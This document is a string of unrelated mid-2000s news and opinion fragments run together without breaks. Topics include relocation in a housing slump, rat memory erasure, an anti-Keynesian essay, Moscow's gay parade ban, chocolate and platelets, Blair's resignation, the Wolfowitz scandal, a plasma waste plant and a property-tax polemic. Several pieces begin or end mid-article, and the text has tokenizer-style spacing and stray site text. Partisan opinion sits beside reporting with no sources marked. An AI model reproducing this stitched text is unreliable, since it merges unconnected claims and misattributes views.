A few years ago , the average stay was 48 days , says Mindy Pauley , global account director of Bridge­StreetWorldwide , a temporary housing provider .
" We 're seeing that figure increase because of the inability to dispose of a house . "
For months Greenish lived in a rented room in Charlotte , returning home every other weekend .
The price on his house continued to drop .
" The profit was just going away , " Greenish says .
" We started questioning our decision to move .
It was getting harder and harder – the financial issues of living in two places , traveling back and forth , and the general strain on a marriage . "
The publishing company that hired him offered Greenish no relocation reimbursement or buyout of his house .
" That seems to be the trend now , " he says .
" If the company is actively recruiting somebody , or it's a high - level job , that 's a different thing .
But a lot of companies are n't ready to absorb relocation costs anymore . "
He tells of a neighbor , an architect , who received only $ 1,000 from his new employer to move from Denver to Orlando .
In 2006 , the average cost to transfer a current employee who owns a home was $ 64,235 , according to Worldwide ERC .
For a renter , the cost was $ 18,736 .
Moving new hires costs a business less .
In areas such as Florida , companies typically pay $ 2,000 to $ 3,000 a month for a furnished two - bedroom executive suite , Drescher says .
In San Diego and San Francisco , monthly costs average between $ 3,000 and $ 5,000 .
Moving companies hurt , too
Moving companies , too , are feeling repercussions .
" We 're dealing in a fairly soft market , " says Ron Martin , regional sales manager for United Van Lines in St. Louis .
" Business is based on corporations needing people . "
Some companies are avoiding or postponing moves by turning to telecommuting .
" It 's a lot cheaper to set them up in their home with all the tools , " Drescher says .
" The Internet provides the ability to perform the same task that they would at a bricks - and - mortar location . "
For families , the current housing market raises complex questions .
" It 's not as simple as , ' Hey , honey , I have a new job , we need to move , ' " says Jim Lanzalotto , vice president of Yoh , an outsourcing firm in Philadelphia .
" Now you have to evaluate whether it 's worthwhile to make the change . "
He calls the current slump " unprecedented " and " nondiscriminatory , " because it stretches across the country .
Previous slumps were more regional , he says .
Some transferred homeowners are taking a wait - and - see approach by renting .
Drew Marich , general manager of rent.com , notes that traffic on his apartment - rental site is up more than 20 percent from last year .
He has rented out his own home near San Francisco and is renting a home in Los Angeles .
A friend of his plans to sell his home in San Francisco and rent in Palo Alto , Calif. , where he 's taken a new job .
His employer will subsidize the rent .
" It just does n't seem like a good time to take a risky bet , " Mr. Marich says .
Family concerns are No. 1
Despite these challenges , housing is not the top concern in a move .
" The No. 1 reason employees turn down an opportunity to move is because of family , " says Cris Collie , executive vice president of Worldwide ERC , an employee relocation council in Washington , D.C .
Sometimes family reasons also help to propel a move back .
Two years ago , Jeff Sinatra moved from Boston to Detroit to start a new job with a financial services company .
Assuming his family would be putting down long - term roots , he and his wife bought a suburban Colonial and settled in .
But before long Mr. Sinatra realized that all was not well with the job .
" The owner misrepresented himself and the opportunity , " he says .
Most of the management team ended up leaving .
Now , as Sinatra considers his next career step , he and his wife want to return to Boston , where their families live .
But because of massive layoffs in the auto industry in the past year , the Detroit housing market is flooded with " For Sale " signs .
" We 'll either rent our house or foreclose , because we can't sell it , " Sinatra says .
He remains philosophical and optimistic , saying , " I 've learned a lot of good lessons . "
For Greenish and his family , their failed attempt to sell their house had a happy ending .
They took their house off the market , and he was able to return to his former position at Conceive magazine .
" It was the best decision , " he says .
" In some ways it was good that we tried to move , because it reaffirmed that we like where we are .
We put a foot over the fence , and the grass was n't entirely greener . "
Kim Hahn , CEO of the multimedia company in Orlando that publishes Conceive , was glad to hire Greenish back when he decided not to relocate to Charlotte .
But she urges employers to do everything they can to make a move possible .
" Employees are your greatest asset , " she says .
" I would not let an employee go because of their inability to sell their house .
I would get them a laptop and get them set up at home until they could relocate their family .
It 's not forever that a house wo n't sell . "
David Barlow , senior vice president of Sirva Relocation , sees encouraging signs that businesses , at least those in the Fortune 500 , are improving their relocation policies .
" More and more companies , in order to get through this real estate downturn , are having to provide a way out for transferees who cannot sell their home , " he says .
Marc Freeman , author of " Renegotiate With Integrity , " tells those considering a career - related move to weigh all aspects of the deal .
If housing is an issue , speak up .
" You have to be completely up front and honest with them , saying , ' I need your help if you want me to relocate .
It does n't make sense for me to make this move if I 'm going to lose $ 30,000 on my house and you 're only giving me $ 20,000 more in salary . '
Get the company to say , ' OK , we 'll take care of that loss up front . ' "
Four questions to ask first
As employees grapple with the pros and cons of moving , Dan Coughlin , an executive coach in St. Louis , emphasizes that the housing market is only one of many variables in the decision .
He suggests considering three questions : " What am I changing from , and why ?
What am I changing to , and why ?
And how am I going to make that change ? "
A final question : " Is the short - term cost of not being able to sell my house worth the longer - term benefit of being able to enhance my career ? "
He adds , " It 's still a risk to change cities to try to enhance your career . "
Those who track real estate trends remain optimistic .
" The housing market has always come back reasonably strong , " says Brian Drum , CEO of Drum Associates , a consulting firm in New York .
" In the next couple years it will come back again . "
Until then , Mr. Freeman encourages a long - term view : " Sometimes you 've just got to take your hit and move on , " he says .
" If moving on is the best thing to do , then do n't look back .
Count your blessings for what you have – that you have a job , you 're progressing in your career , and somebody wants you enough to move you to a new location .
Look at those positive things , grab hold of those , and drop the negatives , because they 'll just slow you down . "

Drug can clear away one fearful memory while leaving another intact .
A single frightening thought can be erased from a rat 's mind .
Alamy
A single , specific memory has been wiped from the brains of rats , leaving other recollections intact .
The study adds to our understanding of how memories are made and altered in the brain , and could help to relieve sufferers of post - traumatic stress disorder ( PTSD ) of the fearful memories that disrupt their lives .
The results are published in Nature Neuroscience1 .
The brain secures memories by transferring them from short - term to long - term storage , through a process called reconsolidation .
It has been shown before that this process can be interrupted with drugs .
But Joseph LeDoux of the Center for Neural Science at New York University and his colleagues wanted to know how specific this interference was : could the transfer of one specific memory be meddled with without affecting others ?
" Our concern was : would you do something really massive to their memory network ? " says LeDoux .
Scary music
To find out , they trained rats to fear two different musical tones , by playing them at the same time as giving the rats an electric shock .
Then , they gave half the rats a drug known to cause limited amnesia ( U0126 , which is not approved for use in people ) , and reminded all the animals , half of which were still under the influence of the drug , of one of their fearful memories by replaying just one of the tones .
When they tested the rats with both tones a day later , untreated animals were still fearful of both sounds , as if they expected a shock .
But those treated with the drug were no longer afraid of the tone they had been reminded of under treatment .
The process of re-arousing the rats ' memory of being shocked with the one tone while they were drugged had wiped out that memory completely , while leaving their memory of the second tone intact .

LeDoux 's team also confirms the idea that a part of the brain called the amygdala is central to this process - communication between neurons in this part of the brain usually increases when a fearful memory forms , but it decreases in the treated rats .
This shows that the fearful memory is actually deleted , rather than simply breaking the link between the memory and a fearful response .
Greg Quirk , a neurophysiologist from the Ponce School of Medicine in Puerto Rico , thinks that psychiatrists working to treat patients with conditions such as PTSD will be encouraged by the step forward .
" These drugs would be adjuncts to therapy , " he says .
" This is the future of psychiatry - neuroscience will provide tools to help it become more effective . "

The war is the Middle East is escalating .
The U.S. stock market is down because of this .
Investors perceive that these events could lead to higher oil prices .
They perceive that this would be bad for the economy .
The problem is , the upward move of the stock market since 2003 has paralleled both the two - front war and rising oil prices .
What was it about the war that seems to have been beneficial for the stock market ?
Ever since 1940 , when the U.S. unemployment rate fell in the wake of Great Britain ’s wartime spending on American - made armaments , popular economics has concluded that war is good for business , just so long as the American home front is out of the line of fire .
The economic reasons why U.S. employment rose during World War II are never discussed in history textbooks or economics textbooks .
There were two main reasons : ( 1 ) inflated dollars , coupled with price controls and rationing , pushed down real wages , thereby increasing the demand for labor ; ( 2 ) approximately 12 million men were drafted and taken out of the domestic labor markets .
Immediately after World War II ended , but before price controls were removed , the United States government began to fight a new war : the Cold War .
From that time until now , government spending on the military has remained part of the economists ’ “ tool kit ” of policies to overcome unemployment .
I call this approach to economics “ tooth fairy economics . ”
My parents played the tooth fairy game with me .
I briefly believed that old teeth had a market value .
They also told me that Santa Claus brought me presents .
Briefly , I believed that a man in a red suit and a white beard — a Karl Marx look - alike — brought free goodies to good little girls and boys .
But , eventually , they told me the truth .
Modern tooth fairy economics takes the level of implausibility up a notch .
War is part of the fairy ’s tooth - extraction program .
She knocks out teeth in order to give adults the raw materials required in her wealth - creation program .
In political circles , this is called guns and butter .
I call it Keynesianism with an attitude .
KEYNESIAN ECONOMIC THEORY
I decided early in life that I would never believe in tooth fairies again , of any variety .
That is what kept me from becoming a Keynesian economist .
When I was in college , almost every academic economist was a Keynesian .
Why ?
Because they just could not shake off the emotional effects of their childhood belief in the tooth fairy .
They merely shifted their faith to a different fairy .
Keynes — pronounced “ Canes ” — believed that the Great Depression was caused by inadequate consumer spending .
Individuals were saving far too much money , but they were not investing it properly .
Businesses should have been hiring new workers .
But there was low or falling demand for goods and services , so business owners were unwilling to borrow to expand production except to buy labor - saving equipment , leading to additional unemployment .
Here is a standard explanation of Keynes ’ theory .
It appears in the Wiki encyclopedia .
To Keynes , excessive saving , i.e. saving beyond planned investment , was a serious problem encouraging recession even depression .
Excessive saving results if investment falls , perhaps due to falling consumer demand , over - investment in earlier years , or pessimistic business expectations , and if saving does not immediately fall in step .
Does this sound reasonable to you ?
If it does , then you should ask yourself the following questions :
If there is literally no demand for borrowed funds , why wo n’t people just hoard currency ?
If they hoard currency , why wo n’t prices fall even more ?
When prices fall far enough so that some people think the bottom has been reached for the items they want to buy , why wo n’t they spend their hoarded currency ?
The price of goods cannot fall to zero .
We live in a world of scarcity .
We do not live in the Big Rock Candy Mountain .
So , at some point , consumers will start spending .
Keynes ’ position assumes that people are either irrational or uninformed about what to do with their own money .
I ask :
What is it about economic freedom that leads to bad results for the overall economy when people act in their own self - interest , based on the information available to them in their specific situations ?
Then there is Keynes ’ solution .
Keynes ’s theory suggested that active government policy could be effective in managing the economy .
Rather than seeing unbalanced government budgets as wrong , Keynes advocated what has been called counter - cyclical fiscal policies , that is policies which acted against the tide of the business cycle : deficit spending when a nation ’s economy suffers from recession or when recovery is long - delayed and unemployment is persistently high — and the suppression of inflation in boom times by either increasing taxes or cutting back on government outlays .
He argued that governments should solve short - term problems rather than waiting for market forces to do it , because “ in the long run , we are all dead . ”
This is a correct summary of Keynes ’ position .
He wrote this in his magnum opus , General Theory of Employment , Interest , and Money ( 1936 ) .
Ancient Egypt was doubly fortunate , and doubtless owed to this its fabled wealth , in that it possessed two activities , namely , pyramid - building as well as the search for precious metals , the fruits of which , since they could not serve the needs of many by being consumed , did not stale with abundance .
The Middle Ages built cathedrals and sang dirges .
Two pyramids , two masses for the dead , are twice as good as one ; but not so two railways from London to York . ( p. 131 )
He was a defender of government make - work projects .
When we were children , teachers assigned us busy work to keep us occupied .
Eventually , we caught on : the work was not meaningful .
It was wasting our time .
Keynes advised the governments of his era to imitate our teachers .
If the Treasury were to fill old bottles with banknotes , bury them at suitable depths in disused coal mines which are then filled up to the surface with town rubbish , and leave it to private enterprise on well tried principles of laissez - faire to dig the notes up again .
( Ibid. , p. 129 )
While Keynesian economics textbooks rarely quote his words , which are too embarrassing , they present equations that show — or seem to show — that the solution to unemployment is government spending .
The government can spend its money on projects that will create demand for labor .
PICKPOCKET ECONOMICS 101
What is the answer to this line of reasoning ?
First , where does the government get the money to increase spending ?
There are only three sources : ( 1 ) new taxes ; ( 2 ) borrowing from the public ; and ( 3 ) selling IOUs to the central bank , which creates money out of nothing to buy the IOUs .
Taxation removes money from one group in order to hand it over to another group ( minus handling charges ) .
Borrowing removes money from one group , backed by the legal power to tax people in the future , to then hand it over to another ( minus handling charges . )
The third approach , monetary inflation , is an indirect form of taxation .
It redistributes real wealth to those people who gain early access to the newly created money , who then spend it at yesterday ’s prices .
Then the new money pushes up prices .
The late - comers pay because of reduced purchasing power .
The second answer is to follow the money .
Whatever is spent by the recipients of government spending , including the government bureaucrats who administer the spending programs , is not spent by the taxed groups or the groups that lend money to the government .
In other words , there is no such thing as a free lunch .
Put differently , there is no tooth fairy .
Third , with the exception of those few people who hide currency at home , the money that would have been saved by the taxed groups or the lending groups would have been used by businessmen to buy something .
The largest component of all purchases goes to labor .
A small percentage — usually under 10 % — goes to raw materials owners .
The more advanced the economy , the lower this percentage is .
So , someone receives the money .
The money is always in someone ’s bank account .
The Keynesians tell us what a great benefit the government offers to the public at large : lots of new spending .
Businesses will increase hiring in order to meet the expected new demand provided by the government and its designated spenders .
To see what is involved in this line of thinking , think of the government as a pickpocket .
You ask yourself : “ What about all those people who had their wallets lifted ?
What happens to their spending ? ”
You ask this because ( 1 ) you never really understood your one college course in economics , and ( 2 ) you read articles like this one .
There are not many people like you .
They do n’t constitute a major voting bloc .
GOLDILOCKS ECONOMICS
Butter is a consumer good .
Except in the surplus goods stores , military equipment is n’t .
When scarce resources are used to create new consumer goods , the result is new demand , assuming that the buying public wants these new goods at the prices offered .
This demand comes from people as producers .
They have wealth to trade .
When resources are used to create weaponry , there is monetary demand from those who produced the weapons , but there is a reduced supply of consumer goods .
The resources that were used to create weapons are not used to produce new consumer goods .
If the Federal Reserve System does not buy assets , it ’s a case of “ existing money chasing fewer goods . ”
If the FED does buy U.S. debt in order to hold down interest rates , then it ’s a question of “ new money plus old money chasing fewer goods . ”
The reality is fewer goods .
The inflationists insist : “ You ca n’t eat gold ! ”
We ca n’t eat nuclear aircraft carriers , either .
As wars in the Middle East escalate , the American economy will get poorer than it would otherwise have been .
The investing public believes in tooth fairy economics .
Like Goldilocks , investors do n’t want too much war , but they do n’t want too little , either .
They want a “ just right ” amount of war .
There is a growing perception that the American economy is moving from “ just right ” to “ too much ” war .
The stock market is reflecting this concern .
CONCLUSION
We are caught in a lobster trap .
We cannot back out until the voters decide that getting out of the trap is more important than worrying about being labeled “ cut and run . ”
So , the Administration pushes the nation more deeply into the trap , in the ever - fading hope that there is a solution ahead .
Now that the State of Israel is at war on two fronts , with armed Arab revolutionaries on both borders in the position of being able to hit and run at will , it has become apparent that democracy has failed in the Islamic Middle East .
Lebanon is democratic .
Its government remains powerless to deal with Hezbollah , which has elected representatives in the government .
The Palestinian Authority is democratic .
Hamas was elected to run it .
Iraq is democratic .
It is moving into civil war .
Iran is democratic .
It is run by a populist with a Ph.D. in engineering and a desire to extend Iran ’s influence , meaning Shi’ite influence , across the Middle East .
He wants Israel pushed into the sea .
Result : more guns , less butter .
Anyone who thinks that it ’s morning for the U.S. economy is a victim of tooth fairy economics .
Mourning , maybe .

Luzhkov : Gay propaganda " unacceptable "
Speaking to reporters , Mr Luzhkov described such events as " satanic " .
Moscow banned a gay march in 2006 , citing the threat of violence .
People who ignored the ban were beaten up by counter - demonstrators and arrested .
Gay activists say the ban breaches their fundamental human rights .
They say they intend to appeal to the European Court of Human Rights .
" Last year , Moscow came under unprecedented pressure to sanction the gay parade , which cannot be called anything other than satanic , " Mr Luzhkov said .
Trying to silence us , the Russian authorities denied us one of the fundamental human rights
Nikolai Alexeyev , parade organiser
Gay pride challenges Moscow
" We did not let the parade take place then , and we are not going to allow it in the future , " he said .
The mayor also blamed groups which he said were receiving grants from the West for spreading what he dismissively referred to as " this kind of enlightenment " in Russia .
He thanked the head of the Russian Orthodox Church , Patriarch Alexy II , for supporting him in banning a gay march last year .
Defiant
Some people who took part in the unauthorised event were beaten up by right - wing counter - demonstrators or detained by police .
Moscow 's gay community is split over the march
But the parade 's organisers say they plan to hold the event in May and will appeal against the ban in the Strasbourg court .
" Trying to silence us , the Russian authorities denied us one of the fundamental human rights .
The European justice will have the last say in this case , " Nikolai Alexeyev , one of the parade organisers , said in a statement .
Gay activists in Russia are divided over whether the march should be held , the BBC's James Rodgers in Moscow says .
Some suggest that holding the parade at all will simply provoke a backlash from their opponents , our correspondent says .
Some " chocoholics " who just could n't give up their favorite treat to comply with a study to test blood stickiness have inadvertently done their fellow chocolate lovers - and science - a big favor .
Their " offense , " say researchers at Johns Hopkins led to what is believed to be the first biochemical analysis to explain why just a few squares of chocolate a day can almost halve the risk of heart attack death in some men and women by decreasing the tendency of platelets to clot in narrow blood vessels .
" What these chocolate ' offenders ' taught us is that the chemical in cocoa beans has a biochemical effect similar to aspirin in reducing platelet clumping , which can be fatal if a clot forms and blocks a blood vessel , causing a heart attack , " says Diane Becker , M.P.H. , Sc.D. , a professor at The Johns Hopkins University School of Medicine and Bloomberg School of Public Health .
Becker cautions that her work is not intended as a prescription to gobble up large amounts of chocolate candy , which often contains diet - busting amounts of sugar , butter and cream .
But as little as 2 tablespoons a day of dark chocolate - the purest form of the candy , made from the dried extract of roasted cocoa beans - may be just what the doctor ordered .
Researchers have known for nearly two decades that dark chocolate , rich in chemicals called flavonoids , lowers blood pressure and has other beneficial effects on blood flow .
The latest Hopkins findings , to be presented Nov. 14 at the American Heart Association 's annual Scientific Sessions in Chicago , identified the effect of normal , everyday doses of chocolate found in ordinary foods , unlike previous studies that found decreased platelet activity only at impractically high doses of flavonoids equivalent to eating several pounds of chocolate a day .
" Eating a little bit of chocolate or having a drink of hot cocoa as part of a regular diet is probably good for personal health , so long as people do n't eat too much of it , and too much of the kind with lots of butter and sugar , " says Becker .
In the study , 139 people Becker - whom Becker somewhat tongue in cheek calls " chocolate offenders " - were disqualified from a much larger study looking at the effects of aspirin on blood platelets .
The Genetic Study of Aspirin Responsiveness ( GeneSTAR ) was conducted at Hopkins from June 2004 to November 2005 and enrolled more than 500 men and 700 women participants nationwide .
Shortly before aspirin dosing began for the subjects , they were told to stay on a strict regimen of exercise and to refrain from smoking or using foods and drinks known to affect platelet activity .
These included caffeinated drinks , wine , grapefruit juice - and chocolate .
The non-compliers - who admitted to eating chocolate - were a diverse group who got their flavonoid " fix " from a variety of sources , including chocolate bars , cups of hot cocoa , grapes , black or green tea , and strawberries .
And while they were excluded from the aspirin study , Becker and her team scoured their blood results for chocolate 's effect on blood platelets , which the body recycles on a daily basis .
When platelet samples from both groups were run through a mechanical blood vessel system designed to time how long it takes for the platelets to clump together in a hair - thin plastic tube , the chocolate lovers were found to be less reactive , on average taking 130 seconds to occlude the system .
Platelets from those who stayed away from chocolate as instructed clotted faster , at 123 seconds .
In another key test of urine for waste products of platelet activity , primarily urinary thromboxane ( 11 - dehydro - thromboxane B2 ) , scientists found that chocolate eaters showed less activity and waste products on average , at 177 nanograms per millimol of creatinine , versus an average of 287 nanograms per millimol of creatinine in the group that abstained .
Participants ranged in age from 21 to 80 ; 31 percent were black and the rest were white .
In total , more than 200 different tests of platelet reactivity were performed and analyzed in the study .
Because whole blood contains other cells that affect platelet aggregation , testing was repeated using a purified version of test samples made up of strictly platelet - rich plasma .
None of the " offenders " had previous histories of heart problems , such as a heart attack , but all were considered to be at slightly increased risk of heart disease because of family history .
Fifty percent of women participants were postmenopausal .
" These results really bring home the point that a modest dietary practice can have a huge impact on blood and potentially on the health of people at a mildly elevated risk of heart disease , " says study co-author Nauder Faraday , M.D. , an associate professor at Hopkins .
" But we have to careful to emphasize that one single healthy dietary practice cannot be taken alone , but must be balanced with exercise and other healthy lifestyle practices that impact the heart . "

The Telegraph :
Tony Blair promised yesterday that he would stand down as Prime Minister " in the next few weeks " .
The announcement was a late attempt to avert a large protest vote against Labour in tomorrow 's mid-term elections .
He is planning to announce next Wednesday or Thursday that he is resigning as Labour leader .
The decision should see Gordon Brown succeed him in Downing Street by July 2 .
Bush 's war , and Bush himself , will define Blair 's legacy :
As the Prime Minister prepares to announce his resignation next week , the survey by CommunicateResearch reveals that 69 per cent of the British public believe he will be remembered most for the Iraq war .
Remarkably , his next highest " legacy rating " - just 9 per cent - is for his relationship with the American President , George Bush .
Four years after the US - led invasion , Iraq still dwarfs all other issues .
Only 6 per cent of voters believe Mr Blair will be remembered most for the Northern Ireland peace process , which he will hail as an important part of his legacy when self - government is restored in the province a week today .
- Belfast Telegraph
Unlike Bush , though , Blair retains the respect of a majority of his constituents :
Everybody wants to have an optimized life .
In fact , there are hundreds of books , seminars , and trainings devoted to this topic .
Nevertheless , there is actually one simple thing you can do to optimize your life : do what you love .
Sounds simple , right ?
Yet doing what you love can really maximize many aspects of your life .
A lot of good things will naturally happen in your career , family , and relationship .
How can that be ?
Here are five reasons why doing what you love can optimize your life :
You will enjoy your time
Since you are doing what you love , you wo n’t feel burdened doing it .
You will have fun and happy time .
You will be happier than before .
This thing alone is a great reward of doing what you love .
Who do n’t want to have a joyful day ?
You will yield higher - quantity of works
Since you enjoy your time doing your works , naturally you will devote more time and energy into it .
There is no such thing as “ lazy ” or “ not in a good mood of doing it ” .
As such , you will accomplish more and become more productive .
You will deliver higher - quality works
Not just the quantity is higher , the quality will also be higher .
Again , because you really like it , you will pour more of your time and energy into it .
That allows you to think more about your works , thinking about how to make them better and better .
As a result , the quality of your works will be improved .
Your works will have touches of passion
This the the key difference between good works and great works .
Works which are done with passion are very different to those which are n’t .
People who consume them can tell the difference .
Works which are done with passion not only have higher - quality , but also have emotional value attached in them .
It will flow out of the works and touch the heart of the people using them .
You will have a fulfilling life
This is probably the most important reason of all .
Since you follow your heart , you will have a fulfilling life .
You follow what your heart tell you , and you follow your purpose .
That ’s how you have a fulfilling life .
In my opinion , having a fulfilling life is more – even much more – important than just being wealthy .
Following your heart and following your purpose .
That ’s what life is all about .

On Tuesday , when this page runs the list of people it has endorsed for election , we will include no Republican Congressional candidates for the first time in our memory .
Although Times editorials tend to agree with Democrats on national policy , we have proudly and consistently endorsed a long line of moderate Republicans , particularly for the House .
Our only political loyalty is to making the two - party system as vital and responsible as possible .
That is why things are different this year .
To begin with , the Republican majority that has run the House — and for the most part , the Senate — during President Bush ’s tenure has done a terrible job on the basics .
Its tax - cutting - above - all - else has wrecked the budget , hobbled the middle class and endangered the long - term economy .
It has refused to face up to global warming and done pathetically little about the country ’s dependence on foreign oil .
Republican leaders , particularly in the House , have developed toxic symptoms of an overconfident majority that has been too long in power .
They methodically shut the opposition — and even the more moderate members of their own party — out of any role in the legislative process .
Their only mission seems to be self - perpetuation .
The current Republican majority managed to achieve that burned - out , brain - dead status in record time , and with a shocking disregard for the most minimal ethical standards .
It was bad enough that a party that used to believe in fiscal austerity blew billions on pork - barrel projects .
It is worse that many of the most expensive boondoggles were not even directed at their constituents , but at lobbyists who financed their campaigns and high - end lifestyles .
Since the end of the Cold War , Private Military Companies ( PMCs ) and Private Security Companies ( PSCs ) have played a growing role in defense , homeland security , and humanitarian reconstruction .
Ongoing instability since the terrorist attacks of 9/11 has further boosted demand for private military and security services .
Into the 21st century , PMCs and PSCs play critical roles in the fight against transnational and cyber crime .
Launched in 1999 , PrivateMilitary.org® continues to be a key source of information for those participating in the privatization of security debate .

In the mind of some Americans , the occupation of Iraq is revenge for the attack on September 11 , 2001 .
This is of course absurd , since Iraq had nothing to do with 9/11 .
The images below attempt to compare the casualties in those two horrible episodes of early 21st century history , in the hope of evoking some sympathy among Americans for the unfathomable suffering of the Iraqi people in the wake of the U.S. invasion .
In these figures , each pixel represents 3000 people .
The white pixels represent people who were killed in each conflict .
United States , September 11 , 2001 : approximately 3000 deaths in a population of approximately 300,000,000 .
Iraq , 2003 to 2006 : very probably at least 600,000 deaths in a population of approximately 30,000,000 .
Remember the pain caused by 3 planes crashing into buildings on 9/11 .
Imagine it had been 60 planes , distributed among all the states of the U.S.
Taking into account the relative size of the total population , that would have amounted to 1 % of the deaths Iraq has suffered in this war .
Sorry , no posts found for your query .
What could be better than a power station that eats up dirty landfill and churns out clean electricity ?
One facility in Utashinai , Japan , has been doing just that since 2003 , using plasma — an electrically induced stream of hot , charged particles — to process up to 220 tons of municipal solid waste a day .
Now a bigger and better $ 425 million plant is scheduled for completion by 2009 in Saint Lucie County , Florida .
The operator , Atlanta - based Geoplasma , expects it to generate 160 megawatts of electricity — enough to power 36,000 homes — from a daily diet of trash .
At the plant , garbage will be superheated to more than 10,000 degrees Fahrenheit — about the temperature of the sun ’s surface — by a NASA - developed plasma torch .
Organic components will be gasifed by the heat ; the inorganic remainder will be melted and removed .
Syngas , a mixture of carbon monoxide and hydrogen , will be extracted from the gas output and used to drive turbines and generate electricity .
Gases from the plant will be processed to remove dangerous compounds like dioxins , and the company pledges that emissions will be well under state and federal environmental limits .
Heavy metals from the inorganic dross will be collected and sold as scrap .
Geoplasma hopes to do better than the Japanese facility , which generates just enough power for internal consumption .
Operators there say that a chronic shortage of trash and unfavorable electricity prices have hampered the plant ’s operations .
The Florida facility , however , will be built right next to a large landfill , which the company will dig into at a daily rate of 1,000 tons — along with 2,000 tons of brand - new trash to be trucked in .
Geoplasma is negotiating contracts to sell three - quarters of the electricity generated by the plant to a utility company .
“ It provides a solution to two growing problems for communities : increased waste and the need for more energy , ” says Geoplasma president , Hilburn O. Hillestad .
“ Garbage disposal problems and rising energy costs have driven the economics of a plasma arc solution beyond possible to necessary . ”
Paul Wolfowitz 's tenure as president of the World Bank may be decided today by the bank 's governing board , after he was abandoned by the Bush administration and faced a revolt led by his own deputy .
When Mr Wolfowitz asked a meeting of senior staff yesterday what he could do to repair faith in his leadership , he was told bluntly to resign by Graeme Wheeler , a managing director of the bank and one of two deputies to the president .
Mr Wheeler - a well - respected New Zealander appointed to his post by Mr Wolfowitz last year - told the meeting of 30 vice - presidents at the bank 's headquarters in Washington that Mr Wolfowitz should go for the good of the organisation .
Several vice - presidents said they agreed with Mr Wheeler .
Mr Wolfowitz is said to have replied that he did n't think his resignation would be in the bank 's best interests , and that he had no intentions of going .
Sources inside the bank have described the situation as " civil war " .
The Bank 's staff association has called for Mr Wolfowitz to resign , and a group of senior staff have threatened to quit if he stays .
Other staff are planning to wear blue ribbons to show their support for the calls for his resignation .
The World Bank 's board , made up of 24 directors representing the bank 's member countries , has cancelled its previous agenda for today to discuss Mr Wolfowitz 's personal intervention to secure pay increases and benefits for his girlfriend , Shaha Riza , shortly after he took over as head of the bank .
Yesterday the Bush administration suggested it was prepared to see the board sanction Mr Wolfowitz - a signal that its patience is wearing thin .
After reiterating that President Bush had " full confidence " in Mr Wolfowitz , a White House spokesman said : " I think the effort of the World Bank board should be to get to the facts , treat it with fairness and think of the long - term effectiveness of the institution . "
The careful formulation used by the White House indicated that it was washing its hands of Mr Wolfowitz , a bank source said .
Another sign that his defenders are giving up came in a damning editorial published in a staunchly Republican newspaper .
The Washington Times called on Mr Wolfowitz to step down as his leadership had been " rendered ineffective " by the scandal .
" Mr Wolfowitz has lost the reputation for ethical impeccability on which the World Bank relies , " the newspaper wrote .
Although many other newspapers , including the Financial Times and the New York Times , have already called on Mr Wolfowitz to go , the Washington Times is an insight into the thinking of conservative Republicans , who were delighted at Mr Wolfowitz 's appointment by President Bush in 2005 .
Mr Wolfowitz had been a hero to many on the right for his prominent advocacy of the US invasion of Iraq when he worked for the Bush administration .
Since taking over as president of the World Bank , Mr Wolfowitz has redirected the bank 's priorities towards fighting corruption and encouraging good governance - an effort critics say is damaged by the controversy surrounding Ms Riza .
The events of the scandal took place in 2005 , when Mr Wolfowitz overruled bank staff to demand a 46 % pay increase and a promotion for Ms Riza when she was moved outside the bank to avoid rules forbidding partners from working together .
Ms Riza was seconded to the US state department , where she was paid more than Condoleezza Rice , the secretary of state .
In recent days evidence has emerged that a contractor for the US government working in Iraq said in 2003 that it was ordered to hire Ms Riza as a consultant on governance issues .
The order was issued by Douglas Feith , then undersecretary of defence .
Mr Wolfowitz was deputy secretary at the Pentagon at the time , and Mr Feith 's boss .
The single most important tax reform of the 1980s was the indexation of the federal income tax to inflation and the reduction of the number of federal income tax brackets from fifteen to three .
Prior to that , ordinary middle class workers were pushed up into higher and higher tax brackets by simply receiving cost - of - living pay increases .
The result was that a couple of years of cost - of - living increases actually reduced your standard of living by diminishing your overall take - home pay after taxes while enriching the state .
Under this corrupt scheme the Federal Reserve would print excessive amounts of money , which created inflation .
The inflation led to cost - of - living increases that in turn led to " bracket creep " and higher tax payments .
The federal government 's budget became bloated while the taxpayers suffered .
Politicians never had to take the heat for voting for a tax increase ; inflation did it for them .
It was truly a form of taxation without representation ( not that taxation with representation is any better ) .
The federal government is no longer capable of plundering middle - class taxpayers in this particular way , thanks to indexation .
But state and local governments do through the vehicle of property taxation .
The Fed 's expansionary monetary policy over the past decade has caused artificially low interest rates , which have fueled the real estate boom ( or bubble , as some would say ) .
Along with extraordinary increases in property values has come equally extraordinary property tax increases all across America .
According to online reports of tax revenues in my own state of Maryland , local governments in the Baltimore area alone collect about 35 percent more in property tax revenues than they did in 2000 .
Are Baltimore 's schools 35 percent better ?
Are the police 35 percent more efficient ?
Are citizens getting a third more services from City Hall ?
Of course not ; they 're simply paying that much more for the same crappy " services . "
State and local politicians are reveling in " budget surpluses , " which should be more appropriately named undeserved windfall " profits . "
These revenue increases are the result of an extreme form of price gouging by the state which is , after all , a monopoly in all that it does .
On top of higher property taxes , many homeowners who have sold their homes have also been snared by capital gains taxes , not to mention the confiscatory " property transfer tax " in some states , which gives the government its percentage " take " of every real estate transaction , not unlike how the Tony Soprano gang of HBO fame goes about its business of making " collections " from local merchants .
After gouging taxpayers for years in this way , this election year has suddenly turned many local politicians into " tax cutters " — sort of .
Republican Governor Robert Ehrlich of Maryland has magnanimously proposed to cut the state 's property tax rate so much that it would save the average Maryland homeowner as much as $ 40 a year , almost enough to attend a Baltimore Orioles baseball game — alone .
This comes three years after he raised the state property tax rate by 57 percent .
The first Republican governor in Maryland in thirty - five years " celebrated " his victory by imposing the largest property tax increase in the state 's history .
Ignorant Maryland voters still believe that voting Republican is a vote against Big Government !
The property tax bonanza that is being enjoyed by state and local governmental bureaucracies creates yet another evil .
Whenever state and local governments experience windfall " profits " such as this they use the money to appease more and more special interest groups by starting up myriad new programs .
Then when the real estate market cools , or the economy in general slows down , the programs all remain in place while revenues shrink , creating a " deficit crisis . "
This in turn leads to calls for even more tax increases , which impose further harm on the local economy .
There is never any mention of making government more efficient because government cannot be made more efficient any more than a cat can be taught to bark like a dog .
Thus , property tax increases today inevitably lead to even more increases in the future , while impoverishing taxpayers more and more and damaging local economies .
During the early 1990s , after the last big real estate boom ( of the 1980s ) , states that had experienced more modest revenue growth were in the best financial condition because they were limited in their ability to go on wild spending binges .
State and local politicians are monopolistic price gougers .
Every one of them should be thrown out of office this fall , just for the fun of it .
The MPAA , so used to suing file - swapping networks and BitTorrent search engines , now finds the tables turned .
